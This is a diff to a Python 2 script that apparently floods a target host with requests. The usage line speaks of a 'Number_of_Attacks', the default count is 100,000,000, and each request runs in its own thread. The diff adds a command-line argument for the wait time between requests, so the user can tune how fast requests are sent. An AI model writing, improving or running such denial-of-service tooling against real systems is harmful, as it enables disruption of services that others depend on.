@@ -14,18 +14,27 @@ host = ""
 ip = ""
 port = 0
 num_requests = 0
+wait_time = 0
 
 if len(sys.argv) == 2:
     port = 80
     num_requests = 100000000
+    wait_time = 0.01
 elif len(sys.argv) == 3:
     port = int(sys.argv[2])
     num_requests = 100000000
+    wait_time = 0.01
 elif len(sys.argv) == 4:
     port = int(sys.argv[2])
     num_requests = int(sys.argv[3])
+    wait_time = 0.01
+elif len(sys.argv) == 5:
+    port = int(sys.argv[2])
+    num_requests = int(sys.argv[3])
+    wait_time = float(sys.argv[4])
+
 else:
-    print "ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks >"
+    print "ERROR\n Usage: " + sys.argv[0] + " < Hostname > < Port > < Number_of_Attacks > <wait_time>"
     sys.exit(1)
 
 # Convert FQDN to IP
@@ -91,7 +100,7 @@ for i in xrange(num_requests):
     all_threads.append(t1)
 
     # Adjusting this sleep time will affect requests per second
-    time.sleep(0.01)
+    time.sleep(wait_time)
 
 for current_thread in all_threads:
     current_thread.join()  # Make the main thread wait for the children threads
